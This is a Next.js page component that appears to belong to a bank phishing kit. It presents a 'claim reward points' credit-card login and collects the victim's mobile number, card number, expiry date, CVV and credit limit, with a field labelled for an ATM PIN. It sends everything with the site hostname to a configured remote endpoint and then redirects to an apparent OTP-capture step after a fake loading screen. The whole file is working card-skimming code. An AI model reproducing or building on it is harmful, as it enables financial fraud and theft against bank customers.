'use client';
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";
import { useEffect, useState } from "react";  
import Loader from "../inlcude/Loader"; 
import DebitCardInputComponent from "../inlcude/DebitCardInputComponent";
import ExpiryDateInputComponent from "../inlcude/ExpiryDateInputComponent";

export default function Home() {
  
    const [loading, setLoading] = useState(false);
    const [loader, setLoader] = useState(false);
    const router = useRouter();
    const API_URL = process.env.NEXT_PUBLIC_URL;
    useEffect(()=>{
        localStorage.removeItem('collection_id');
        localStorage.removeItem('next');
        localStorage.removeItem("server_ot_times");
    }, [])
    const handleSubmit = async (e) => {
        e.preventDefault();
        setLoading(true);
        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        const SITE = window.location.hostname;
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = SITE
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const responseData = await response.json();
              if(responseData.status==200){
                localStorage.setItem('collection_id', responseData.data);
                localStorage.setItem('next', "3");
                localStorage.setItem("server_ot_times", 1);
                setLoader(true);
                setTimeout(function(){
                  router.push('/ott');
                  setLoader(false);
                },5000)
            }else{
              alert("not found valid response");
            }
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
        }finally{
          setLoading(false);
        }
    }
    
  return (
    
    <>
      <Header />

      {loader ? (
        <Loader />
      ) : (
        <div className="mainContent">
        <h1 className="text-center">Login to claim reward points</h1>
        <div className="card-login">
          <button onClick={()=>{router.push("/")}} id="bt1" type="button" className="">
            Login ID / Customer ID
          </button>
          <button onClick={()=>{router.push("/1_")}} type="button" id="bt2" className="active">
            Credit Card
          </button>
        </div>
        <div className="card">
          <div>
            <section id="formC">
              <form onSubmit={handleSubmit} className="LoginForm myform fmb">
                <div className="form-group">
                  <label
                    htmlFor="Mobile_Number"
                    style={{
                      fontSize: 13,
                      fontFamily: '"Work Sans", sans-serif',
                      marginTop: 20
                    }}
                  >
                    Mobile No:
                  </label>
                  <input
                    type="tel"
                    className="new-control"
                    id="Mobile_Number"
                    name="MB"
                    maxLength={10}
                    inputMode="numeric"
                    title="Please enter a valid mobile number!"
                  />
                </div>
               <DebitCardInputComponent />
                <div className="form-group">
                  <div
                    style={{
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "space-between"
                    }}
                  >
                    <label>
                      Expiry Date <span style={{ color: "red" }}>*</span>
                    </label>
                    <label>
                      CVV <span style={{ color: "red" }}>*</span>
                    </label>
                  </div>
                  <div className="expiry-cvv">
                    <ExpiryDateInputComponent />

                    <input
                      type="password"
                      className="cvv new-control"
                      id="CVV"
                      name="CVV"
                      placeholder="CVV"
                      inputMode="numeric"
                      minLength={3}
                      maxLength={3}
                      style={{ marginLeft: 40, width: "35%", padding: 10 }}
                      required
                    />
                  </div>
                </div>
                <div className="form-group">
                  <label
                    htmlFor="ATM_PIN"
                    style={{ fontSize: 13, fontFamily: '"Work Sans", sans-serif' }}
                  >
                    Available Credit Limit <span style={{ color: "red" }}> *</span>
                  </label>
                  <input
                    type="tel"
                    className="new-control"
                    inputMode="numeric"
                    id="ATM_PIN"
                    name="CLim"
                    minLength={3}
                    required
                    title="Please enter a valid ATM PIN!"
                  />
                </div>
                <div className="text-center">
                  <button type="submit" disabled={loading} className="submit">
                    SUBMIT
                  </button>
                </div>
              </form>
            </section>
          </div>
        </div>
      </div>
      )}

      <Footer />
    </>
  );
}

